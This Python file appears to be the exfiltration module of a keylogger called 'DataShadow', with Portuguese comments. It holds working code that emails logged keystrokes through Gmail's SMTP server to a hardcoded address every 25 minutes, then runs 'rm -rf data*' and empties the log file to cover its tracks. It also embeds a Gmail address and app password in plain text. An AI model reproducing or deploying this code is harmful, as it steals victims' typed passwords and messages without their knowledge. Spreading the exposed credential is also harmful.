import smtplib
from email.message import EmailMessage
import datetime
import time
import os

def sendmail():
            os.system("touch logs.txt")
            email = "yhelenasw@gmail.com"
            senha_do_gmail = "lzbatebfonurcjif"

            msg = EmailMessage()
            msg['Subject'] = "Enviando relatório de </DataShadow>"
            msg['From'] = "yhelenasw@gmail.com"
            msg['To'] = "yhelenasw@gmail.com"
            msg.set_content("Segue o relatório de teclas do DataShadow")

            with open("logs.txt", "rb") as content_file:
                hora_now = datetime.datetime.now()
                hora_formatada = hora_now.strftime("%Y-%m-%d_%H-%M-%S")
                rename = os.rename("logs.txt", f"data_{hora_formatada}.txt")

                content = content_file.read()
                msg.add_attachment(content, maintype='application', subtype='pdf', filename=f"data_{hora_formatada}.txt")

            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            
                smtp.login(email, senha_do_gmail)
                smtp.send_message(msg)
            os.system("rm -rf data*")
            os.system("echo '' > logs.txt")



def time_verify():

    hora_inicial = datetime.datetime.now() + datetime.timedelta(minutes=25)

    while True:
        agora = datetime.datetime.now()
        if agora >= hora_inicial:
            sendmail()
            hora_inicial = agora + datetime.timedelta(minutes=25)
        time.sleep(60)  # Espera 1 minuto antes de verificar novamente

